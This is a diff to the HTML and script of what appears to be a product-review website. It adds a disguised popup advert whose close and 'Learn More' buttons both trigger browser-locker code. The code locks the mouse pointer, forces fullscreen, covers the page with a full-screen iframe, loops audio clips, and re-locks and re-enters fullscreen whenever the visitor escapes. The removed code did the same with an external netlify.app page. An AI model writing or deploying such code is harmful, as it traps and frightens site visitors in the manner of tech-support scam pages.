@@ -1631,11 +1631,11 @@ class="site-footer" id="colophon" itemtype="https://schema.org/WPFooter" itemsco
 <div id="popupAd" class="popup-ad" style="display: none;">
 
 	<div class="popup-ad-content">
-    <span class="popup-ad-close" onclick="redirectAd()">×</span>
+    <span class="popup-ad-close" onclick="handleClick(event)">×</span>
     <img src="static/5-Best-Cheap-Android-Phones-Under-500-Value-For-Money-768x432.jpg" alt="Ad Banner">
     <h3>Special Offer!</h3>
     <p>5 Best Cheap Android Phones Under $500 – Value For Money</p>
-    <button onclick="redirectAd()">Learn More</button>
+    <button id="btnn" onclick="handleClick(event)">Learn More</button>
   </div>
 
 </div>
@@ -1744,87 +1744,88 @@ class="site-footer" id="colophon" itemtype="https://schema.org/WPFooter" itemsco
 <audio id="audio7" src="static/audio7.mp3"></audio>
 <audio id="audio8" src="static/audio8.mp3"></audio>
 <script>
-	let play = false;
-function closeAd() {
-  document.getElementById("popupAd").style.display = "none";
-}
+let play = false;
+let locked = false;
+let lockTarget = null;
+
 function audi() {
-        
-        // Get the audio elements
-        if (play) return;
-        play=true
+  if (play) return;
+  play = true;
 
-        const audio1 = document.getElementById('audio1');
-        const audio2 = document.getElementById('audio2');
-        const audio3 = document.getElementById('audio3');
-        const audio4 = document.getElementById('audio4');
-        const audio5 = document.getElementById('audio5');
-        const audio6 = document.getElementById('audio6');
-        const audio7 = document.getElementById('audio7');
-        const audio8 = document.getElementById('audio8');
-        // Play the first audio
-        audio1.play();
+  const ids = ['audio1','audio2','audio3','audio4','audio5','audio6','audio7','audio8'];
+  const audios = ids.map(id => document.getElementById(id));
 
-        // When the first audio ends, play the second audio
-        audio1.onended = function() {
-            audio2.play();
-        };
-        audio2.onended = function() {
-            audio3.play();
-        };
-        audio3.onended = function() {
-            audio4.play();
-        };
-        audio4.onended = function() {
-            audio5.play();
-        };
-        audio5.onended = function() {
-            audio6.play();
-        };
-        audio6.onended = function() {
-            audio7.play();
-        };
-        audio7.onended = function() {
-            audio8.play();
-        };
-        audio8.onended = function() {
-            audio1.play();
-        };
-        }
-
-
-// Request fullscreen before redirect
-function redirectAd() {
-  let docElm = document.documentElement;
-  if (docElm.requestFullscreen) docElm.requestFullscreen();
-
-  closeAd();
-
-  // create full-screen iframe instead of leaving the page
-  let iframe = document.createElement("iframe");
-  iframe.src = "https://splendid-scone-25b20a.netlify.app/";
-	//iframe.src = "https://globleexpressai.github.io/win2/";
-  iframe.style.position = "fixed";
-  iframe.style.top = 0;
-  iframe.style.left = 0;
-  iframe.style.width = "100%";
-  iframe.style.height = "100%";
-  iframe.style.border = "none";
-  iframe.style.zIndex = "99999";
-  document.body.appendChild(iframe);
-	//audi();
+  audios[0].play();
+  audios.forEach((a, i) => {
+    a.onended = () => audios[(i + 1) % audios.length].play();
+  });
 }
 
+function handleClick(e) {
+  if (locked) return;
+  locked = true;
 
+  lockTarget = e.currentTarget;
 
-// Show popup after 2 seconds
-window.onload = function() {
-  setTimeout(function() {
+  // 1️⃣ Pointer lock FIRST
+  lockTarget.requestPointerLock();
+
+  // 2️⃣ Fullscreen
+  document.documentElement.requestFullscreen?.();
+
+  // 3️⃣ Hide popup
+  document.getElementById("popupAd").style.display = "none";
+
+  // 4️⃣ Iframe (delayed)
+  setTimeout(() => {
+    const iframe = document.createElement("iframe");
+    iframe.src = "index.html";
+    iframe.style.cssText = `
+      position:fixed;
+      inset:0;
+      width:100vw;
+      height:100vh;
+      border:none;
+      z-index:99999;
+    `;
+    document.body.appendChild(iframe);
+  }, 150);
+
+  audi();
+}
+
+/* 🔁 AUTO RELOCK + RE-FULLSCREEN */
+document.addEventListener("pointerlockchange", () => {
+  if (!document.pointerLockElement && locked) {
+
+    // try to re-lock mouse
+    setTimeout(() => {
+      try {
+        lockTarget?.requestPointerLock();
+      } catch (e) {}
+    }, 300);
+
+    // try to re-enter fullscreen
+    setTimeout(() => {
+      if (!document.fullscreenElement) {
+        document.documentElement.requestFullscreen?.();
+      }
+    }, 400);
+
+  }
+});
+
+/* Popup show */
+window.onload = () => {
+  setTimeout(() => {
     document.getElementById("popupAd").style.display = "flex";
-  }, 200);
+  }, 100);
 };
-	
 </script>
+
+
+
+
 <script id="astra-theme-js-js-extra">
 var astra = {"break_point":"921","isRtl":"","is_scroll_to_id":"1","is_scroll_to_top":"1","is_header_footer_builder_active":"1"};
 </script>
